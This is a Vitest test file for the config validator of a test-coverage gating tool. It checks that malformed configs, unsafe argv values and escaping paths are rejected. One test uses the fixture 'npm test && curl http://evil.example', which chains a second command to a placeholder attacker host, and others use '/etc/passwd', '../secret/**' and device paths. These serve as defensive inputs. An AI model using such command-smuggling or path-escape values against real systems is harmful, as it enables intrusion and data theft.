import { describe, expect, it } from "vitest";
import { validateConfig } from "@host/config/schema.js";

const validMinimal = {
  schemaVersion: 1,
  packages: [
    {
      id: "web",
      root: "packages/web",
      languages: ["typescript"],
      include: ["packages/web/src/**/*.ts"],
      test: {
        adapter: "vitest-istanbul",
        argv: ["pnpm", "vitest", "run", "--coverage"],
        cwd: "packages/web",
        timeoutMs: 120000,
        coverageFile: "packages/web/coverage/coverage-final.json"
      }
    }
  ]
};

describe("config validation (fail loud)", () => {
  it("accepts a minimal valid config and applies defaults", () => {
    const cfg = validateConfig(validMinimal, ".changeproof.yml");
    expect(cfg.thresholds.changedLines).toBe(1.0);
    expect(cfg.coverage.requireArtifact).toBe(true);
    expect(cfg.packages[0]!.test.adapter).toBe("vitest-istanbul");
  });

  it("rejects unknown top-level fields", () => {
    expect(() => validateConfig({ ...validMinimal, extra: 1 }, "c")).toThrowError(/unknown field "extra"/);
  });

  it("rejects wrong schemaVersion", () => {
    expect(() => validateConfig({ ...validMinimal, schemaVersion: 2 }, "c")).toThrowError(/schemaVersion/);
  });

  it("rejects shell-string argv", () => {
    const bad = structuredClone(validMinimal) as typeof validMinimal;
    bad.packages[0]!.test.argv = ["npm test && curl http://evil.example"];
    expect(() => validateConfig(bad, "c")).toThrowError(/shell command line/);
  });

  it("rejects argv with non-string entries", () => {
    const bad = structuredClone(validMinimal) as typeof validMinimal;
    (bad.packages[0]!.test as { argv: unknown }).argv = ["npm", 42];
    expect(() => validateConfig(bad, "c")).toThrowError(/argv/);
  });

  it("rejects path escapes in cwd/coverageFile", () => {
    for (const field of ["cwd", "coverageFile"]) {
      const bad = structuredClone(validMinimal) as typeof validMinimal;
      (bad.packages[0]!.test as Record<string, unknown>)[field] = field === "cwd" ? "../outside" : "packages/web/../../coverage.json";
      expect(() => validateConfig(bad, "c")).toThrowError();
    }
  });

  it("rejects absolute and device paths", () => {
    for (const evil of ["C:\\Windows\\system32", "\\\\server\\share", "/etc/passwd", "CON", "com1"]) {
      const bad = structuredClone(validMinimal) as typeof validMinimal;
      bad.packages[0]!.root = evil;
      expect(() => validateConfig(bad, "c")).toThrowError();
    }
  });

  it("rejects thresholds out of [0,1]", () => {
    expect(() => validateConfig({ ...validMinimal, thresholds: { changedLines: 1.5 } }, "c")).toThrowError(/\[0, 1\]/);
    expect(() => validateConfig({ ...validMinimal, thresholds: { changedLines: -0.1 } }, "c")).toThrowError(/\[0, 1\]/);
  });

  it("rejects duplicate package ids and ambiguous nested roots", () => {
    const dup = structuredClone(validMinimal);
    dup.packages.push(structuredClone(dup.packages[0]!) as (typeof dup.packages)[number]);
    expect(() => validateConfig(dup, "c")).toThrowError(/duplicate/);

    const nested = structuredClone(validMinimal);
    nested.packages.push({
      id: "nested",
      root: "packages/web/src",
      languages: ["typescript"],
      include: ["packages/web/src/**/*.ts"],
      test: {
        adapter: "vitest-istanbul",
        argv: ["npx", "vitest", "run"],
        cwd: "packages/web/src",
        timeoutMs: 60000,
        coverageFile: "packages/web/src/coverage.json"
      }
    });
    expect(() => validateConfig(nested, "c")).toThrowError(/overlapping roots/);
  });

  it("rejects unknown adapter ids and languages", () => {
    const bad = structuredClone(validMinimal) as typeof validMinimal;
    bad.packages[0]!.test.adapter = "go-test";
    expect(() => validateConfig(bad, "c")).toThrowError(/adapter/);
    const bad2 = structuredClone(validMinimal);
    bad2.packages[0]!.languages = ["golang"];
    expect(() => validateConfig(bad2, "c")).toThrowError(/language/);
  });

  it("rejects mappings globs containing ..", () => {
    const bad = { ...validMinimal, mappings: [{ sources: ["../secret/**"], tests: ["**/*.test.ts"], confidence: "HIGH" }] };
    expect(() => validateConfig(bad, "c")).toThrowError(/\.\./);
  });

  it("rejects checks referencing unknown packages", () => {
    const bad = { ...validMinimal, checks: [{ id: "c1", package: "nope", tier: "cheap", argv: ["true"] }] };
    expect(() => validateConfig(bad, "c")).toThrowError(/package/);
  });

  it("rejects cheap checks without argv", () => {
    const bad = { ...validMinimal, checks: [{ id: "c1", package: "web", tier: "cheap" }] };
    expect(() => validateConfig(bad, "c")).toThrowError(/cheap checks must define argv/);
  });

  it("accepts the full example from PROJECT.md section 13", () => {
    const full = {
      schemaVersion: 1,
      packages: [
        {
          id: "web",
          root: "packages/web",
          languages: ["typescript"],
          include: ["packages/web/src/**/*.ts", "packages/web/src/**/*.tsx"],
          test: {
            adapter: "vitest-istanbul",
            argv: ["pnpm", "vitest", "run", "--coverage"],
            cwd: "packages/web",
            timeoutMs: 120000,
            coverageFile: "packages/web/coverage/coverage-final.json"
          }
        },
        {
          id: "api",
          root: "services/api",
          languages: ["python"],
          include: ["services/api/src/**/*.py"],
          test: {
            adapter: "pytest-coverage-json",
            argv: ["python", "-m", "pytest", "--cov=src", "--cov-report=json:coverage.json"],
            cwd: "services/api",
            timeoutMs: 120000,
            coverageFile: "services/api/coverage.json"
          }
        }
      ],
      checks: [
        { id: "web-typecheck", package: "web", tier: "cheap", required: true, argv: ["pnpm", "exec", "tsc", "--noEmit"], cwd: "packages/web", timeoutMs: 60000 },
        { id: "api-tests", package: "api", tier: "targeted-test", required: true, usePackageTestAdapter: true }
      ],
      mappings: [
        { sources: ["packages/web/src/billing/**"], tests: ["packages/web/src/billing/**/*.test.ts", "packages/web/tests/billing/**/*.spec.ts"], confidence: "HIGH" },
        { sources: ["services/api/src/payments/**"], tests: ["services/api/tests/payments/**"], confidence: "HIGH" }
      ],
      coverage: { changedLinesOnly: true, requireArtifact: true, sourceMap: "auto", historyMap: { enabled: true, maxAgeDays: 14 } },
      thresholds: { changedLines: 1.0, minimumImpactConfidence: "MEDIUM" },
      exclude: ["**/generated/**", "**/*.d.ts", "**/migrations/**", "**/vendor/**"]
    };
    const cfg = validateConfig(full, ".changeproof.yml");
    expect(cfg.packages).toHaveLength(2);
    expect(cfg.checks).toHaveLength(2);
    expect(cfg.mappings).toHaveLength(2);
    expect(cfg.exclude).toHaveLength(4);
  });
});
